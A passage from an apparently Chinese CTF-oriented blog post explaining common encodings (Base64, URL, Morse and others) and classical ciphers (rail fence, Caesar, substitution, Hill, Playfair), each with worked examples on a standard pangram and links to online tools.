MIME,在XML中存储复杂数据。</p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/ygXNkdOmJ9or.png?imageslim" alt="mark"></p><p>举个例子(base64)：</p><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p><p>利用Python base64模块，我们分别可以这样加密解密base64 32 16：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/hUz5RvDWF2Gm.png?imageslim" alt="mark"></p><h3 id="3-shellcode编码"><a href="#3-shellcode编码" class="headerlink" title="3.shellcode编码"></a>3.shellcode编码</h3><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>#!shell\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</code></pre><p><img src="http://cdn.sijiu.ren/blog/20200426/udmmBKnQDYRB.png?imageslim" alt="mark"></p><h3 id="4-Quoted-printable-编码"><a href="#4-Quoted-printable-编码" class="headerlink" title="4.Quoted-printable 编码"></a>4.Quoted-printable 编码</h3><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理 <a href="http://blog.chacuo.net/494.html" target="_blank" rel="noopener">参考</a> 。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/raAYjyVMK3cn.png?imageslim" alt="mark"></p><p>源文本： <code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p>编码后：</p><pre><code>#!shell=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97</code></pre><p>编码解码 <a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">链接</a></p><h3 id="5-XXencode编码"><a href="#5-XXencode编码" class="headerlink" title="5.XXencode编码"></a>5.XXencode编码</h3><p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。</p><p><img src="http://cdn.sijiu.ren/blog/20200426/Y3l3GuwKlqDu.png?imageslim" alt="mark"></p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后： <code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p><p>编码解码 <a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="noopener">链接</a></p><h3 id="6-UUencode编码"><a href="#6-UUencode编码" class="headerlink" title="6.UUencode编码"></a>6.UUencode编码</h3><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后： `M5&amp;AE(‘%U:6-K(&amp;)R;W=N(&amp;9O&gt;”!J=6UP</p><p>编码解码 <a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">链接</a></p><h3 id="7-URL编码"><a href="#7-URL编码" class="headerlink" title="7.URL编码"></a>7.URL编码</h3><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>源文本： <code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>#!shell%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</code></pre><p>编码解码 <a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="noopener">链接</a></p><h4 id="8-Unicode编码"><a href="#8-Unicode编码" class="headerlink" title="8.Unicode编码"></a>8.Unicode编码</h4><p>Unicode编码有以下四种编码方式：</p><p>源文本： <code>The</code></p><p>&amp;#x [Hex]： <code>The</code></p><p>&amp;# [Decimal]： <code>The</code></p><p>\U [Hex]： <code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]： <code>\U+0054\U+0068\U+0065</code></p><p>编码解码 <a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="noopener">链接</a></p><h3 id="9-Escape-Unescape编码"><a href="#9-Escape-Unescape编码" class="headerlink" title="9.Escape/Unescape编码"></a>9.Escape/Unescape编码</h3><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><p>源文本： <code>The</code></p><p>编码后： <code>%u0054%u0068%u0065</code></p><h3 id="10-HTML实体编码"><a href="#10-HTML实体编码" class="headerlink" title="10.HTML实体编码"></a>10.HTML实体编码</h3><p><img src="http://cdn.sijiu.ren/blog/20200426/lH1n76NbLcr8.png?imageslim" alt="mark"></p><p>完整编码手册 <a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="noopener">参考</a></p><h3 id="11-敲击码"><a href="#11-敲击码" class="headerlink" title="11.敲击码"></a>11.敲击码</h3><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p><p>敲击码表:</p><pre><code>#!shell  1  2  3  4  51 A  B C/K D  E2 F  G  H  I  J 3 L  M  N  O  P4 Q  R  S  T  U5 V  W  X  Y  Z</code></pre><p><img src="http://cdn.sijiu.ren/blog/20200426/p7hMfyG0ODS4.jpg?imageslim" alt="mark"></p><h3 id="12-莫尔斯电码"><a href="#12-莫尔斯电码" class="headerlink" title="12.莫尔斯电码"></a>12.莫尔斯电码</h3><p>摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用 <code>/</code> 划分）</li><li>以及句子之间长的停顿</li></ol><p>摩尔斯电码字母和数字对应表：</p><pre><code>#!shellA  .-    N  -.    .  .-.-.-  +  .-.-.    1  .----B  -...  O  ---   ,  --..--  _  ..--.-   2  ..---C  -.-.  P  .--.  :  ---...  $  ...-..-  3  ...--D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...    4  ....-E  .     R  .-.   &#39;  .----.  /  -..-.    5  .....F  ..-.  S  ...   !  -.-.--              6  -....G  --.   T  -     ?  ..--..              7  --...H  ....  U  ..-   @  .--.-.              8  ---..I  ..    V  ...-  -  -....-              9  ----.J  .---  W  .--   ;  -.-.-.              0  -----K  -.-   X  -..-  (  -.--.           L  .-..  Y  -.--  )  -.--.-          M  --    Z  --..  =  -...-</code></pre><p>源文本: <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>编码后:</p><pre><code>#!shell- .... . / --.- ..- .. -.-. -.- / -... .-. --- .-- -. / ..-. --- -..- / .--- ..- -- .--. ... / --- ...- . .-. / - .... . / .-.. .- --.. -.-- / -.. --- --.</code></pre><p>在线编码解码 <a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">传送门</a></p><p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如 <code>·-·-·-·-·-</code> 表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考 <a href="https://zh.wikipedia.org/wiki/摩尔斯电码" target="_blank" rel="noopener">WiKi</a> 。</p><h3 id="13-编码的故事"><a href="#13-编码的故事" class="headerlink" title="13.编码的故事"></a>13.编码的故事</h3><p>推荐大家去看 <a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS" target="_blank" rel="noopener">编码的故事</a> 一文。</p><h2 id="各种文本加密"><a href="#各种文本加密" class="headerlink" title="各种文本加密"></a>各种文本加密</h2><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。</p><p>加密示例：</p><p>源文本： <code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p><img src="http://cdn.sijiu.ren/blog/20200426/YSHuOgRR6ctc.png?imageslim" alt="mark"></p><p>编码解码 <a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">链接</a></p><h2 id="换位加密"><a href="#换位加密" class="headerlink" title="换位加密"></a>换位加密</h2><h3 id="1-栅栏密码"><a href="#1-栅栏密码" class="headerlink" title="1.栅栏密码"></a>1.栅栏密码</h3><h4 id="（1）介绍"><a href="#（1）介绍" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</p><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p><p>去空格： <code>Thequickbrownfoxjumpsoverthelazydog</code></p><p>分组： <code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p><p>第一组： <code>Teucbonojmsvrhlzdg</code></p><p>第二组： <code>hqikrwfxupoeteayo</code></p><p>密文： <code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="noopener">传送门</a></p><h3 id="2-曲路密码"><a href="#2-曲路密码" class="headerlink" title="2.曲路密码"></a>2.曲路密码</h3><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。</p><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p><p>填入5行7列表(事先约定填充的行列数)</p><p><img src="http://cdn.sijiu.ren/blog/20200426/M1cKVMafgkBg.png?imageslim" alt="mark"></p><p>加密的回路线(事先约定填充的行列数)</p><p><img src="http://cdn.sijiu.ren/blog/20200426/OE6mqsNvTn0Q.png?imageslim" alt="mark"></p><p>密文： <code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p><h3 id="3-列移位密码"><a href="#3-列移位密码" class="headerlink" title="3.列移位密码"></a>3.列移位密码</h3><h4 id="（1）介绍-1"><a href="#（1）介绍-1" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p><p>填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)</p><p><img src="http://cdn.sijiu.ren/blog/20200426/M1cKVMafgkBg.png?imageslim" alt="mark"></p><p>密钥： <code>how are u</code></p><p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/in7pkGPdxq6T.png?imageslim" alt="mark"></p><p>密文： <code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p><p>这里提供一个行列数相等的填充规则列移位密码加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="noopener">链接</a></p><p>另外由列移位密码变化来的密码也有其他的，比如 <a href="http://www.thonky.com/kryptos/amsco-cipher" target="_blank" rel="noopener">Amsco密码</a> (Amsco Cipher)和 <a href="http://www.thonky.com/kryptos/cadenus-cipher" target="_blank" rel="noopener">Cadenus密码</a> (Cadenus Cipher)。</p><h2 id="替换加密"><a href="#替换加密" class="headerlink" title="替换加密"></a>替换加密</h2><h3 id="1-埃特巴什码"><a href="#1-埃特巴什码" class="headerlink" title="1.埃特巴什码"></a>1.埃特巴什码</h3><h4 id="（1）介绍-2"><a href="#（1）介绍-2" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p><pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA</code></pre><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p><p>加解密 <a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="noopener">传送门</a></p><h3 id="2-凯撒密码"><a href="#2-凯撒密码" class="headerlink" title="2.凯撒密码"></a>2.凯撒密码</h3><h4 id="（1）介绍-3"><a href="#（1）介绍-3" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多 <a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="noopener">参考</a> 。</p><p>加密实例：</p><p>明文： <code>The quick brown fox jumps over the lazy dog</code></p><p>偏移量：1</p><p>密文： <code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p><p><img src="http://cdn.sijiu.ren/blog/20200426/bkg1RmNlY3nz.png?imageslim" alt="mark"></p><p>你也可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过 <code>pip install pycipher</code> 或者其他方式来安装pycipher模块。</p><pre><code>#!python&gt;&gt;&gt; from pycipher import Caesar&gt;&gt;&gt; Caesar(key=1).encipher(&#39;The quick brown fox jumps over the lazy dog&#39;)&#39;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&#39;&gt;&gt;&gt; Caesar(key=1).decipher(&#39;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&#39;)&#39;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&#39;</code></pre><p>参考表(这里是向后移位加密，向前移位解密)：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/8Nmr2WwKhsA4.jpg?imageslim" alt="mark"></p><p>加密解密 <a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">链接</a> (这个网站可以将26种情况一次性列举出来，比较方便)</p><h3 id="3-ROT5-13-18-47"><a href="#3-ROT5-13-18-47" class="headerlink" title="3.ROT5/13/18/47"></a>3.ROT5/13/18/47</h3><h4 id="（1）介绍-4"><a href="#（1）介绍-4" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p><p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">传送门</a></p><h3 id="4-简单替换密码"><a href="#4-简单替换密码" class="headerlink" title="4.简单替换密码"></a>4.简单替换密码</h3><h4 id="（1）介绍-5"><a href="#（1）介绍-5" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p><pre><code>#!shell明文字母 : abcdefghijklmnopqrstuvwxyz明文字母 : phqgiumeaylnofdxjkrcvstzwb</code></pre><p>明文： <code>the quick brown fox jumps over the lazy dog</code></p><p>密文： <code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p><h4 id="（2）破解"><a href="#（2）破解" class="headerlink" title="（2）破解"></a>（2）破解</h4><p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站 <a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a> ，这里推荐一篇通过”爬山算法”来破解简单替换密码 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/" target="_blank" rel="noopener">文章</a> ，基于文中的算法实现的工具来破解示例。</p><p>密文：</p><pre><code>#!shellpmpafxaikkitprdsikcplifhwceigixkirradfeirdgkipgigudkcekiigpwrpucikceiginasikwduearrxiiqepcceindgmieinpwdfprduppcedoikiqiasafmfddfipfgmdafmfdteiki</code></pre><p>解密：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/Sf1xV3H7yp31.png?imageslim" alt="mark"></p><p>(ps:score值越小越准确)</p><p>密钥： <code>PHQGIUMEAVLNOFDXBKRCZSTJWY</code></p><p>明文：</p><pre><code>#!shellAGAINPIERREWASOVERTAKENBYTHEDEPRESSIONHESODREADEDFORTHREEDAYSAFTERTHEDELIVERYOFHISSPEECHATTHELODGEHELAYONASOFAATHOMERECEIVINGNOONEANDGOINGNOWHERE</code></pre><p>将明文转换成可读句子：</p><p>again pierre was over taken by the depression he so dreaded for three day safter the delivery of his speech at the lodge he lay on a sofa at home receiving no one and going no where</p><h3 id="5-希尔密码"><a href="#5-希尔密码" class="headerlink" title="5.希尔密码"></a>5.希尔密码</h3><h4 id="（1）介绍-6"><a href="#（1）介绍-6" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>希尔密码(Hill Cipher)是基于线性代数多重代换密码，由Lester S. Hill在1929年发明。每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。更多 <a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="noopener">参考</a></p><h4 id="（2）加密"><a href="#（2）加密" class="headerlink" title="（2）加密"></a>（2）加密</h4><p>明文： <code>ACT</code></p><p><img src="http://cdn.sijiu.ren/blog/20200426/l9GnLky6nYlm.png?imageslim" alt="mark"></p><p>明文对应矩阵：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/HssfKxakV153.png?imageslim" alt="mark"></p><p>加密密钥： <code>GYBNQKURP</code></p><p>加密矩阵：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/AVQWbKDc5ayw.png?imageslim" alt="mark"></p><p>计算过程：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/PuvIzgFRYLsI.png?imageslim" alt="mark"></p><p>密文： <code>FIN</code></p><h4 id="（3）解密"><a href="#（3）解密" class="headerlink" title="（3）解密"></a>（3）解密</h4><p>密文： <code>FIN</code></p><p>计算加密矩阵的逆矩阵：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/XWw6W9owVOcF.png?imageslim" alt="mark"></p><p>解密计算：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/XUE68AN3XD3I.png?imageslim" alt="mark"></p><p>明文： <code>ACT</code></p><p>至于证明和求逆可以参考线性代数知识。</p><h4 id="（4）破解"><a href="#（4）破解" class="headerlink" title="（4）破解"></a>（4）破解</h4><p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p><p>这里推荐一篇关于用 <a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/" target="_blank" rel="noopener">已知明文样本攻击的方式破解希尔密码</a> 的文章，基础的希尔密码用 <a href="https://en.wikipedia.org/wiki/Known-plaintext_attack" target="_blank" rel="noopener">已知明文攻击</a> 的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p><p>密文：</p><pre><code>#!shellXUKEXWSLZJUAXUNKIGWFSOZRAWURORKXAOSLHROBXBTKCMUWDVPTFBLMKEFVWMUXTVTWUIDDJVZKBRMCWOIWYDXMLUFPVSHAGSVWUFWORCWUIDUJCNVTTBERTUNOJUZHVTWKORSVRZSVVFSQXOCMUWPYTRLGBMCYPOJCLRIYTVFCCMUWUFPOXCNMCIWMSKPXEDLYIQKDJWIWCJUMVRCJUMVRKXWURKPSEEIWZVXULEIOETOOFWKBIUXPXUGOWLFPWUSCH</code></pre><p>解密：</p><p>解密 <a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="noopener">脚本实例</a></p><p>在线加解密 <a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="noopener">传送门</a></p><h4 id="6-猪圈密码"><a href="#6-猪圈密码" class="headerlink" title="6.猪圈密码"></a>6.猪圈密码</h4><h4 id="（1）介绍-7"><a href="#（1）介绍-7" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多 <a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="noopener">参考</a></p><p>明文字母和对应密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/n9tdyVNApEza.jpg?imageslim" alt="mark"></p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/TxUnPfGwIYbY.png?imageslim" alt="mark"></p><p>在线加密 <a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">传送门</a></p><h4 id="（2）变种"><a href="#（2）变种" class="headerlink" title="（2）变种"></a>（2）变种</h4><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p><p>明文字母和对应密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/dFxFM6tnVKDE.png?imageslim" alt="mark"></p><h4 id="（3）其他变种"><a href="#（3）其他变种" class="headerlink" title="（3）其他变种"></a>（3）其他变种</h4><p>明文字母和对应密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/7wISB4InBu03.jpg?imageslim" alt="mark"></p><p>明文字母和对应密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/efd6PvyzoTeG.jpg?imageslim" alt="mark"></p><p>明文字母和对应密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/JxG9nV5OMcmN.png?imageslim" alt="mark"></p><h3 id="7-波利比奥斯方阵密码"><a href="#7-波利比奥斯方阵密码" class="headerlink" title="7.波利比奥斯方阵密码"></a>7.波利比奥斯方阵密码</h3><h4 id="（1）介绍-8"><a href="#（1）介绍-8" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多 <a href="https://en.wikipedia.org/wiki/Polybius_square" target="_blank" rel="noopener">参考</a></p><p>常见的排布方式：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/G4Jp7bjhCQqp.png?imageslim" alt="mark"></p><p>加密实例：</p><p>明文： <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文： <code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p><h3 id="8-夏多密码-曲折加密"><a href="#8-夏多密码-曲折加密" class="headerlink" title="8.夏多密码(曲折加密)"></a>8.夏多密码(曲折加密)</h3><h4 id="（1）介绍-9"><a href="#（1）介绍-9" class="headerlink" title="（1）介绍"></a>（1）介绍</h4><p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/XlbEGTM2JTid.png?imageslim" alt="mark"></p><p>注意，在以上所示的字母表密钥的底部，列有四个附加符号1，2，3，4.他们可以放在密文中的任何地方。每个附加符号指示，如何转动写有密文的纸张，再进行后续的加密或解密操作，直到出现另一个附加符号。可以把每个附加符号中的那根线看作是指示针，它指示了纸张的上端朝上，朝右，朝下，朝左。比如说：如果出现符号3，那么纸张就应该转动180度，使其上端朝下； 符号2表示纸张上端朝右，依次类推。</p><p>源文本： <code>I AM IN DANGER SEND HELP(我有危险，速来增援)</code></p><p>密文：</p><p><img src="http://cdn.sijiu.ren/blog/20200426/4mfrvX7QK0tt.jpg?imageslim" alt="mark"></p><h3 id="9-普莱菲尔密码"><a href="#9-普莱菲尔密码" class="headerlink" title="9.普莱菲尔密码"></a>9.普莱菲尔密码</h3><p>普莱菲尔密码(Playfair Cipher)是第一种用于实际的双字替换密码，用双字加密取代了简单代换密码的单字加密，很明显这样使得密文更难破译，因为使用简单替换密码的频率分析基本没有什么作用，虽然频率分析，通常仍然可以进行，但是有25×25=625种可能而不是25种可能，可以分为三个步骤，即编制密码表、整理明文、编写译文，下面我们以明文：</p><p><code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code> 和密钥 <code>CULTURE</code> 为例来讲解。普莱菲尔密码又称为单方密码(Single Cipher)之后又出现它的升级版Double Playfair，也就是 <a href="https://en.wikipedia.org/wiki/Two-square_cipher" target="_blank" rel="noopener">二方密码</a> (Two-square Cipher),在之后又有四方密码(Four-square Cipher)</p><h4 id="1-编制密码表"><a href="#1-编制密码表" class="headerlink" title="(1)编制密码表"></a>(1)编制密码表</h4><p>1.整理密钥字母 <code>C U L T U R E</code> ，去掉后面重复的字母得到： <code>C U L T R E</code></p><p>2.用上一步得到的字母自上而下来填补5乘5方表的纵列（也可横排），之后的空白按照相同的顺序用字母表中剩余的字母依次填补完整，得到如下的方格:</p><p><img src="http://cdn.sijiu.ren/blog/20200426/gb5GWJVVIkfr.png?imageslim" alt="mark"></p><p>这一步需要注意的要点：整理密钥字母时，如果出现”Z”，则需要去除，因为在英文里”Z”的使用频率最低，相应的如果是德文，则需将”I”与”J”当作一个字母来看待，而法语则去掉”W”或”K”。</p><h4 id="2-整理明文"><a href="#2-整理明文" class="headerlink" title="(2)整理明文"></a>(2)整理明文</h4><p>我们要遵循的原则是“两个一组”，得到是若干个两两成对的字母段，用到的是明文 <code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code> 与字母” <code>X</code> “：</p><p>1.将明文两两一组按顺序排开，得到： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO G</code></p><p>2.对于末尾的单个字母要加上一个” <code>X</code> “使之成对： <code>TH EQ UI CK BR OW NF OX JU MP SO VE RT HE LA ZY DO GX</code></p><p>这一步需要注意的要点：对于相连字母相同者，每个后面都需要加” <code>X</code> “，例如 <code>TOMORROW</code> ，需要写成： <code>TO 